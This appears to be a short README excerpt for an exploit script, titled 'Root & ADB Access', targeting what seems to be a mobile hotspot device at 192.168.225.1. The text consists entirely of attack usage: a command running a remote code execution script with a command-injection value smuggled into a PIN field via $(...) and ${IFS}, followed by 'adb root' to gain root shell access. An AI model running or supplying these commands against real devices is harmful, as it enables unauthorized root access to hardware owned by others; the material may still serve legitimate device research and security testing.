## Root & ADB Access

Execute the following command to trigger the payload:

```bash
python jodu5174x_pinlock_rce.py https://192.168.225.1/ --ask-pass --cmd 'Aa1$(/sbin/usb_composition${IFS}9025)'
```

Once the payload executes, access ADB with root privileges:

```bash
adb root
```
